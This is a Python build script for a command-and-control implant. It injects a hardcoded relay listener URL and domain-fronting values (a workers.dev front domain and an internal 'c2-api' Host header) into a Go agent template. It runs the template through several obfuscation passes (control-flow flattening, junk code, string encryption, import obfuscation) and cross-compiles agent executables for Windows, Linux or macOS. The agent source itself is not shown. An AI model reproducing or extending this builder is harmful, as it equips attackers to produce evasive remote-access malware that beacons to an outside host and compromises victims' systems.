#!/usr/bin/env python3
import os, sys, subprocess, random, string, tempfile, argparse, importlib, shutil

LISTENER_URL = "https://jocky-relay.dm2528v.workers.dev"
FRONT_DOMAIN = "jocky-relay.dm2528v.workers.dev"
HOST_HEADER = "c2-api.jocky.internal"

def generate_agent_id():
    return "agent-" + ''.join(random.choices(string.hexdigits.lower(), k=8))

def apply_import_obfuscation(content):
    """Apply import obfuscation using existing obfuscate_import_statement."""
    try:
        from .import_table_obfuscator import ImportTableObfuscator
        obf = ImportTableObfuscator()
        lines = content.split('\n')
        new_lines = []
        
        for line in lines:
            stripped = line.strip()
            if stripped.startswith(('import ', 'import (')):
                if not stripped.startswith('import ('):
                    new_lines.append(obf.obfuscate_import_statement(line))
                else:
                    new_lines.append(line)
            else:
                new_lines.append(line)
        
        # Add blank import if missing
        import re
        final_lines = new_lines
        import_block_end = -1
        for i, line in enumerate(final_lines):
            stripped = line.strip()
            if stripped.startswith('import ('):
                for j in range(i + 1, len(final_lines)):
                    if final_lines[j].strip() == ')':
                        import_block_end = j
                        break
                break
        
        if import_block_end > 0:
            has_blank = any('_ "' in final_lines[k] for k in range(import_block_end - 2, import_block_end))
            if not has_blank:
                candidates = ['fmt', 'os', 'time', 'strings', 'strconv', 'net', 'http']
                import_path = __import__('random').choice(candidates)
                final_lines.insert(import_block_end, f'\t_ "{import_path}"')
        
        content = '\n'.join(final_lines)
        print("[+] Applied import_table_obfuscator (blank import added)")
    except Exception as e:
        print(f"[!] Error in import obfuscation: {e}")
    
    return content

def apply_obfuscations(content):
    """Apply obfuscations – only those that work on Go code."""
    is_go_code = content.strip().startswith('package ')
    seed = random.randint(1, 100000)

    # Control flow flattening (works for both Go and Python)
    try:
        from .control_flow_flattener import ControlFlowFlattener
        flattener = ControlFlowFlattener(seed)
        content = flattener.flatten_control_flow(content)
        print("[+] Applied control_flow_flattener.flatten_control_flow")
    except Exception as e:
        print(f"[!] Error in control_flow_flattener: {e}")

    # Skip Python-specific obfuscators for Go code
    if not is_go_code:
        try:
            from .junk_code_injector import JunkCodeInjector
            injector = JunkCodeInjector(seed)
            content = injector.inject_junk_code(content)
            print("[+] Applied junk_code_injector.inject_junk_code")
        except Exception as e:
            print(f"[!] Error in junk_code_injector: {e}")

        try:
            from .variable_encryption import VariableEncryptor
            encryptor = VariableEncryptor(seed)
            content = encryptor.encrypt_strings(content)
            print("[+] Applied variable_encryption.encrypt_strings")
        except Exception as e:
            print(f"[!] Error in variable_encryption: {e}")
    else:
        print("[*] Skipping Python-specific obfuscators (Go code detected)")

    # Import obfuscation
    content = apply_import_obfuscation(content)

    # Fix stray # comments to // (Go-compatible)
    lines = content.split('\n')
    fixed_lines = []
    for line in lines:
        stripped = line.lstrip()
        if stripped.startswith('#') and not stripped.startswith('#!') and not stripped.startswith('//'):
            fixed_lines.append(line.replace('#', '//', 1))
        else:
            fixed_lines.append(line)
    content = '\n'.join(fixed_lines)

    return content

def build_agent(template_path, output_dir, target_os="windows", target_arch="amd64", use_obfuscation=True):
    os.makedirs(output_dir, exist_ok=True)
    abs_output_dir = os.path.abspath(output_dir)
    
    with open(template_path, 'r') as f:
        content = f.read()
    
    agent_id = generate_agent_id()
    print(f"[+] Agent ID: {agent_id}")
    
    # STEP 1: Apply obfuscations FIRST (placeholders are still `{{...}}`)
    if use_obfuscation:
        content = apply_obfuscations(content)
    
    # STEP 2: Replace placeholders LAST (so they are never modified by obfuscation)
    replacements = {
        '{{LISTENER_URL}}': LISTENER_URL,
        '{{FRONT_DOMAIN}}': FRONT_DOMAIN,
        '{{HOST_HEADER}}': HOST_HEADER,
        '{{AGENT_ID}}': agent_id,
    }
    for placeholder, value in replacements.items():
        content = content.replace(placeholder, value)
    
    # Create a temporary directory for the Go build
    temp_dir = tempfile.mkdtemp()
    try:
        go_file_path = os.path.join(temp_dir, 'main.go')
        with open(go_file_path, 'w') as f:
            f.write(content)
        
        go_mod_path = os.path.join(temp_dir, 'go.mod')
        with open(go_mod_path, 'w') as f:
            f.write(f'module agent/{agent_id}\n\ngo 1.20\n')
        
        output_name = os.path.join(abs_output_dir, f"agent_{agent_id}")
        if target_os == "windows":
            output_name += ".exe"
        
        env = os.environ.copy()
        env['GOOS'] = target_os
        env['GOARCH'] = target_arch
        
        cmd = ['go', 'build', '-o', output_name, go_file_path]
        print(f"[*] Compiling for {target_os}/{target_arch} ...")
        result = subprocess.run(cmd, env=env, capture_output=True, cwd=temp_dir)
        
        if result.returncode != 0:
            print("[!] Compilation failed:")
            print(result.stderr.decode())
            return None, None
        
        print(f"[+] Agent built: {output_name}")
        return output_name, agent_id
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--output-dir", "-o", default="./build")
    parser.add_argument("--no-obfuscation", action="store_true")
    parser.add_argument("--os", default="windows", choices=["windows", "linux", "darwin"])
    parser.add_argument("--arch", default="amd64", choices=["amd64", "386", "arm64"])
    args = parser.parse_args()
    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = os.path.join(script_dir, "..", "..", "agent", "main.go")
    if not os.path.exists(template_path):
        print(f"[-] Agent template not found at {template_path}")
        sys.exit(1)
    build_agent(template_path, args.output_dir, args.os, args.arch, not args.no_obfuscation)